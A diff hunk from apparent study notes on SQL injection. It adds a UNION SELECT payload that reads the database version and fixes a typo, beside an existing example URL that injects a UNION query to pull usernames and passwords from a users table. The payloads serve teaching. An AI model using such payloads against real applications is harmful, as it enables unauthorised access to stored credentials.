@@ -41,10 +41,11 @@ when the attacker uses the same communication channel to both launch the attack 
     this checks if data type of 1st column is text , and 2nd column is also text.
 
 
-
+- to find version of database,
+' UNION SELECT @@version, NULL# (null is added because there are 2 columns)
 
     `www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
-    we did'nt give id so it's empty
+    we didn't give id so it's empty
     `output:ac1, passw1, adm1, pass2`
 
 2. Interential(Blind) 
